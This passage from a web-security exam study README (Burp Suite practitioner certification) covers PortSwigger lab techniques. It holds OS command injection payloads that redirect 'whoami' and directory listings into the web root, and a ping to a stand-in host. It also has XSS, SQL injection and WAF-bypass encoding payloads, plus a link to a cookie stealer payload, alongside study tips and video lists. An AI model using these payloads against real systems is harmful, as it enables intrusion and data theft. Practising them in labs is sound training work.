||ls+-al&gt;&gt;/var/www/images/output.txt||
||echo&gt;&gt;output.txt||
||whoami&gt;&gt;/var/www/images/output.txt||
</code></pre></div>
<blockquote>
<p dir="auto">Use working directory discovered using above <code>pwd</code> command to redirect output and read content.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/os-cmd-path-traversal-lfi.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/os-cmd-path-traversal-lfi.png" alt="os CMD path traversal lfi" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Get output file content.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="GET /image?filename=output.txt HTTP/2"><pre class="notranslate"><code>GET /image?filename=output.txt HTTP/2
</code></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection" rel="nofollow">PortSwigger Lab: Blind OS command injection with output redirection</a></p>
<blockquote>
<p dir="auto">Sample Command Injection Basic Payloads:</p>
</blockquote>
<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="; sleep 5
| ping -c 5 exploit.net
`ls`"><pre><span class="pl-k">;</span> sleep 5
<span class="pl-k">|</span> ping -c 5 exploit.net
<span class="pl-s"><span class="pl-pds">`</span>ls<span class="pl-pds">`</span></span></pre></div>
<blockquote>
<p dir="auto">Tip from <em><strong>fullfox</strong></em>:</p>
</blockquote>
<ul dir="auto">
<li>If you can inject in an XML file and you can't find a way to perform an XXE, think about OS command injection using $() or backticks.</li>
</ul>
<hr>
<div class="markdown-heading" dir="auto"><h1 tabindex="-1" class="heading-element" dir="auto">Appendix</h1><a id="user-content-appendix" class="anchor" aria-label="Permalink: Appendix" href="#appendix"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">This section contain <strong>additional</strong> information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python scripts and <a href="#obfuscation">Obfuscation</a> techniques to bypass filters.</p>
</blockquote>
<p dir="auto"><a href="#obfuscation">Obfuscation</a><br>
<a href="#python-scripts">Python Scripts</a><br>
<a href="#focus-scanning">Focus Scanning</a><br>
<a href="#approach">Approach</a><br>
<a href="#extra-training-content">YouTube &amp; Extra Training Content</a><br>
<a href="https://www.epochconverter.com/" rel="nofollow">Convert epoch time to milliseconds from human readable may be in exam</a></p>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Obfuscation</h2><a id="user-content-obfuscation" class="anchor" aria-label="Permalink: Obfuscation" href="#obfuscation"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Obfuscation is the action of making something obscure, unclear, or unintelligible.</p>
</blockquote>
<blockquote>
<p dir="auto">URL and Base64 online encoders and decoders.</p>
</blockquote>
<ul dir="auto">
<li><a href="https://www.urldecoder.org/" rel="nofollow">URL Decode and Encode</a></li>
<li><a href="https://www.base64encode.org/" rel="nofollow">BASE64 Decode and Encode</a></li>
</ul>
<blockquote>
<p dir="auto">URL replacing the period character <code>.</code> with encoded value of <code>%2e</code>.</p>
</blockquote>
<blockquote>
<p dir="auto">Double-encode the injecting payload.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"><pre class="notranslate"><code>/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
</code></pre></div>
<blockquote>
<p dir="auto">HTML encode one or more of the characters. In video by <a href="https://youtu.be/-4ia_L-uLGY" rel="nofollow">z3nsh3ll: Payload obfuscation with HTML encoding</a> he explain post analysis of the lab Stored XSS into <code>onclick</code> event.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;img src=x onerror=&quot;&amp;#x61;lert(1)&quot;&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">img</span> <span class="pl-c1">src</span>=<span class="pl-s">x</span> <span class="pl-c1">onerror</span>="<span class="pl-s">&amp;#x61;lert(1)</span>"<span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">XML encode for bypassing WAFs</p>
</blockquote>
<div class="highlight highlight-text-xml notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;stockCheck&gt;
    &lt;productId&gt;
        123
    &lt;/productId&gt;
    &lt;storeId&gt;
         999 &amp;#x53;ELECT * FROM information_schema.tables
    &lt;/storeId&gt;
&lt;/stockCheck&gt;"><pre>&lt;<span class="pl-ent">stockCheck</span>&gt;
    &lt;<span class="pl-ent">productId</span>&gt;
        123
    &lt;/<span class="pl-ent">productId</span>&gt;
    &lt;<span class="pl-ent">storeId</span>&gt;
         999 <span class="pl-c1">&amp;#x53;</span>ELECT * FROM information_schema.tables
    &lt;/<span class="pl-ent">storeId</span>&gt;
&lt;/<span class="pl-ent">stockCheck</span>&gt;</pre></div>
<blockquote>
<p dir="auto">Multiple encodings together</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;a href=&quot;javascript:&amp;bsol;u0061lert(1)&quot;&gt;Click me&lt;/a&gt;"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">a</span> <span class="pl-c1">href</span>="<span class="pl-s">javascript:&amp;bsol;u0061lert(1)</span>"<span class="pl-kos">&gt;</span>Click me<span class="pl-kos">&lt;/</span><span class="pl-ent">a</span><span class="pl-kos">&gt;</span></pre></div>
<blockquote>
<p dir="auto">SQL CHAR</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)"><pre><span class="pl-k">CHAR</span>(<span class="pl-c1">83</span>)<span class="pl-k">+</span><span class="pl-k">CHAR</span>(<span class="pl-c1">69</span>)<span class="pl-k">+</span><span class="pl-k">CHAR</span>(<span class="pl-c1">76</span>)<span class="pl-k">+</span><span class="pl-k">CHAR</span>(<span class="pl-c1">69</span>)<span class="pl-k">+</span><span class="pl-k">CHAR</span>(<span class="pl-c1">67</span>)<span class="pl-k">+</span><span class="pl-k">CHAR</span>(<span class="pl-c1">84</span>)</pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings" rel="nofollow">Obfuscating attacks using encodings</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Python Scripts</h2><a id="user-content-python-scripts" class="anchor" aria-label="Permalink: Python Scripts" href="#python-scripts"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Python script to <em><strong><a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python/identify">identify</a></strong></em> vulnerabilities in the exam and provide indicators of exploits.</p>
</blockquote>
<p dir="auto"><a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python/identify">Python Script to <em><strong>identify</strong></em> possible vulnerabilities in headers, cookies or the response body</a></p>
<p dir="auto"><a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/python/README.md">Lab Automated Python Scripts</a></p>
<p dir="auto"><a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/python">Automate the solving of the labs using python scripts</a></p>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Approach</h2><a id="user-content-approach" class="anchor" aria-label="Permalink: Approach" href="#approach"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Tips from <a href="https://youtu.be/Lbn8zQJByGY?t=551" rel="nofollow">Daniel Redfern</a> is best I have come access explaining fundamental mechanics in BSCP exam, especially Tip 7, only one active user per application and if you reach stage 2 and you did not use interactive exploit in stage 1 that required the <strong>Deliver to Victim</strong> function of the exploit server, then use an interactive exploit on stage 2 to reach admin user role.</p>
</blockquote>
<blockquote>
<p dir="auto"><a href="https://github.com/Hacking-Notes">Hacking-Notes</a> created a awesome website with an interactive checklist to help people during BSCP exams.<br>
Track phases of attacks checklist:<br>
<a href="https://bscp.guide" rel="nofollow">https://bscp.guide</a></p>
</blockquote>
<blockquote>
<p dir="auto">When stuck in BSCP exam, reference the below <a href="https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/" rel="nofollow">Micah van Deusen blog tip 5 table of category to stages</a> for ways to progress through the stages.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/MicahVanDeusens-blog.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/MicahVanDeusens-blog.png" alt="MicahVanDeusens-blog" style="max-width: 100%;"></a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Identified</h3><a id="user-content-identified" class="anchor" aria-label="Permalink: Identified" href="#identified"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The image below is my view of possible vulnerabilities <em><strong>identified</strong></em> and exploitation to reach the next BSCP exam stage and progress through the exam challenges.<br>
I have managed solve the challenges in green using the <a href="https://portswigger.net/web-security/all-labs" rel="nofollow">PortSwigger Academy Labs</a>, but we never stop learning......</p>
</blockquote>
<p dir="auto"><a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/extras"><img src="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/3stages.png" alt="Passed BSCP Exam Stages" style="height: 230px !important; width: 810px !important; max-width: 100%;"></a></p>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Extra Training Content</h2><a id="user-content-extra-training-content" class="anchor" aria-label="Permalink: Extra Training Content" href="#extra-training-content"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Some great links to YouTube content creators training material and links to study stuff.</p>
</blockquote>
<ul dir="auto">
<li><a href="https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem" rel="nofollow">My YouTube BSCP Study Playlist</a></li>
<li><a href="https://youtu.be/uXDnS5PcjCA" rel="nofollow">Using Burp and Postman, Brad Schiff explain Cookies, Sessions, JSON Web Tokens (JWT) - thanks!</a></li>
</ul>
<p dir="auto">Youtube Information Security content creators channels (<em><strong>in no particular order</strong></em>):</p>
<ol dir="auto">
<li><a href="https://www.youtube.com/@z3nsh3ll/videos" rel="nofollow">z3nsh3ll</a></li>
<li><a href="https://www.youtube.com/@tjchacking/videos" rel="nofollow">TJCHacking</a></li>
<li><a href="https://www.youtube.com/@intigriti/videos" rel="nofollow">intigriti</a></li>
<li><a href="https://www.youtube.com/@7SeasSecurity/videos" rel="nofollow">Seven Seas Security</a></li>
<li><a href="https://www.youtube.com/@RanaKhalil101/videos" rel="nofollow">Rana Khalil</a></li>
<li><a href="https://www.youtube.com/@Tib3rius/videos" rel="nofollow">Tib3rius</a></li>
<li><a href="https://www.youtube.com/@_JohnHammond/videos" rel="nofollow">John Hammond</a></li>
<li><a href="https://www.youtube.com/@TraceTheCode/videos" rel="nofollow">TraceTheCode</a></li>
<li><a href="https://www.youtube.com/@TCMSecurityAcademy/videos" rel="nofollow">The Cyber Mentor</a></li>
<li><a href="https://www.youtube.com/@h0tPlug1n/videos" rel="nofollow">Sabyasachi Paul</a></li>
<li><a href="https://www.youtube.com/@bmdyy/videos" rel="nofollow">bmdyy</a></li>
<li><a href="https://www.youtube.com/@CyberSecurityTV/videos" rel="nofollow">CyberSecurityTV</a></li>
<li><a href="https://www.youtube.com/@Nul1Secur1ty/videos" rel="nofollow">nu11 security</a></li>
<li><a href="https://www.youtube.com/@PortSwiggerTV/videos" rel="nofollow">PortSwigger</a></li>
<li><a href="https://www.youtube.com/@ippsec/videos" rel="nofollow">IppSec</a></li>
<li><a href="https://www.youtube.com/@danielredfern9827/videos" rel="nofollow">Daniel Redfern</a></li>
<li><a href="https://www.youtube.com/@LiveUnderflow/videos" rel="nofollow">LiveUnderflow</a></li>
<li><a href="https://www.youtube.com/@JSONSEC/videos" rel="nofollow">JSONSEC</a></li>
<li><a href="https://www.youtube.com/@thehackerish/videos" rel="nofollow">thehackerish</a></li>
<li><a href="https://www.youtube.com/@davidbombal/videos" rel="nofollow">David Bombal</a></li>
<li><a href="https://www.youtube.com/@LearnWebCode/videos" rel="nofollow">LearnWebCode Brad Schiff</a></li>
</ol>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Footnote</h2><a id="user-content-footnote" class="anchor" aria-label="Permalink: Footnote" href="#footnote"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><strong>Perseverance:</strong> is Persistence in doing something despite difficulty or delay in achieving success.<br>
The <strong>OSCP</strong> certification taught me to <a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main">#TryHarder</a> and gave me the foundation penetration testing skills.<br>
The <strong>BSCP</strong> exam gave me the next level of web application security analyst knowledge.<br>
I hope my notes offer other Information Security Students some guidance and walkthrough tips.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Burp Exam Results</h2><a id="user-content-burp-exam-results" class="anchor" aria-label="Permalink: Burp Exam Results" href="#burp-exam-results"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The Burp Suite Certified Practitioner exam is a challenging practical examination designed to demonstrate your web security testing knowledge and Burp Suite Professional skills.<br>
My tip when preparing, is to understand the academy labs. Extra work is required as the labs do not always provide the identification of the vulnerability step.<br>
In my study notes I document the lab guides from the official PortSwigger academy to make sure I know how to identify the vulnerability, use it in different scenarios and make payloads that show the impact when exploiting the vulnerability. As example crafting a XSS <a href="https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md">cookie stealer payload</a> instead of just calling the <code>print</code> function.<br>
The BSCP qualification on my resume demonstrate a deep knowledge of the latest vulnerability classes and how to exploit Web Applications, proving my hacking ability to employers and the community.</p>
</blockquote>
</article></div></div></div></div></div> <!-- --> <!-- --> <script type="application/json" id="__PRIMER_DATA_:R0:__">{"resolvedServerColorMode":"day"}</script></div>
</react-partial>


      <input type="hidden" data-csrf="true" value="iIWZgIoRh9swqrV3ALqPkSO1QhDmlBL4YxZiez5zFsojawCfqMi6pJPMCb/9wfeTo2rmmeJhdmXPfbpRisFDeQ==" />
</div>
  <div data-view-component="true" class="Layout-sidebar">      

      <div class="BorderGrid about-margin" data-pjax>
        <div class="BorderGrid-row">
          <div class="BorderGrid-cell">
            <div class="hide-sm hide-md">
  <h2 class="mb-3 h4">About</h2>

      <p class="f4 my-3">
        Burp Suite Certified Practitioner Exam Study
      </p>

    <h3 class="sr-only">Topics</h3>
    <div class="my-3">
        <div class="f6">
      <a href="/topics/xss" title="Topic: xss" data-view-component="true" class="topic-tag topic-tag-link">
  xss
</a>
      <a href="/topics/vulnerability" title="Topic: vulnerability" data-view-component="true" class="topic-tag topic-tag-link">
  vulnerability
</a>
      <a href="/topics/pentesting" title="Topic: pentesting" data-view-component="true" class="topic-tag topic-tag-link">
  pentesting
</a>
      <a href="/topics/burp" title="Topic: burp" data-view-component="true" class="topic-tag topic-tag-link">
  burp
</a>
      <a href="/topics/payload" title="Topic: payload" data-view-component="true" class="topic-tag topic-tag-link">
  payload
</a>
      <a href="/topics/portswigger" title="Topic: portswigger" data-view-component="true" class="topic-tag topic-tag-link">
  portswigger
</a>
      <a href="/topics/bscp" title="Topic: bscp" data-view-component="true" class="topic-tag topic-tag-link">
  bscp
</a>
  </div>

    </div>

    <h3 class="sr-only">Resources</h3>
    <div class="mt-2">
      <a class="Link--muted" data-analytics-event="{&quot;category&quot;:&quot;Repository Overview&quot;,&quot;action&quot;:&quot;click&quot;,&quot;label&quot;:&quot;location:sidebar;file:readme&quot;}" href="#readme-ov-file">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-book mr-2">
    <path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.743 3.743 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574ZM8.755 4.75l-.004 7.322a3.752 3.752 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25Z"></path>
</svg>
        Readme
</a>    </div>

  





  <include-fragment src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/hovercards/citation/sidebar_partial?tree_name=main" data-nonce="v2:44c436e9-6f3f-c882-01d1-e5d4aec4503a" data-view-component="true">
  

  <div data-show-on-forbidden-error hidden>
    <div class="Box">
  <div class="blankslate-container">
    <div data-view-component="true" class="blankslate blankslate-spacious color-bg-default rounded-2">
      

      <h3 data-view-component="true" class="blankslate-heading">        Uh oh!
</h3>
      <p data-view-component="true">        <p class="color-fg-muted my-2 mb-2 ws-normal">There was an error while loading. <a class="Link--inTextBlock" data-turbo="false" href="" aria-label="Please reload this page">Please reload this page</a>.</p>
</p>

</div>  </div>
</div>  </div>
</include-fragment>
    <div class="mt-2">
      <a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/activity" data-view-component="true" class="Link Link--muted"><svg text="gray" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-pulse mr-2">
    <path d="M6 2c.306 0 .582.187.696.471L10 10.731l1.304-3.26A.751.751 0 0 1 12 7h3.25a.75.75 0 0 1 0 1.5h-2.742l-1.812 4.528a.751.751 0 0 1-1.392 0L6 4.77 4.696 8.03A.75.75 0 0 1 4 8.5H.75a.75.75 0 0 1 0-1.5h2.742l1.812-4.529A.751.751 0 0 1 6 2Z"></path>
</svg>
        <span class="color-fg-muted">Activity</span></a>    </div>


    <h3 class="sr-only">Stars</h3>
    <div class="mt-2">
      <a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/stargazers" data-view-component="true" class="Link Link--muted"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star mr-2">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg>
        <strong>1.2k</strong>
        stars</a>    </div>

    <h3 class="sr-only">Watchers</h3>
    <div class="mt-2">
      <a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/watchers" data-view-component="true" class="Link Link--muted"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-eye mr-2">
    <path d="M8 2c1.981 0 3.671.992 4.933 2.078 1.27 1.091 2.187 2.345 2.637 3.023a1.62 1.62 0 0 1 0 1.798c-.45.678-1.367 1.932-2.637 3.023C11.67 13.008 9.981 14 8 14c-1.981 0-3.671-.992-4.933-2.078C1.797 10.83.88 9.576.43 8.898a1.62 1.62 0 0 1 0-1.798c.45-.677 1.367-1.931 2.637-3.022C4.33 2.992 6.019 2 8 2ZM1.679 7.932a.12.12 0 0 0 0 .136c.411.622 1.241 1.75 2.366 2.717C5.176 11.758 6.527 12.5 8 12.5c1.473 0 2.825-.742 3.955-1.715 1.124-.967 1.954-2.096 2.366-2.717a.12.12 0 0 0 0-.136c-.412-.621-1.242-1.75-2.366-2.717C10.824 4.242 9.473 3.5 8 3.5c-1.473 0-2.825.742-3.955 1.715-1.124.967-1.954 2.096-2.366 2.717ZM8 10a2 2 0 1 1-.001-3.999A2 2 0 0 1 8 10Z"></path>
</svg>
        <strong>19</strong>
        watching</a>    </div>

    <h3 class="sr-only">Forks</h3>
    <div class="mt-2">
      <a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/forks" data-view-component="true" class="Link Link--muted"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2">
    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
</svg>
        <strong>346</strong>
        forks</a>    </div>


    <div class="mt-2">
      <a class="Link--muted" href="/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fbotesjuan%2FBurp-Suite-Certified-Practitioner-Exam-Study&amp;report=botesjuan+%28user%29">
          Report repository
</a>    </div>
</div>

          </div>
        </div>

        
            <div class="BorderGrid-row">
              <div class="BorderGrid-cell">
                <h2 class="h4 mb-3" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame">
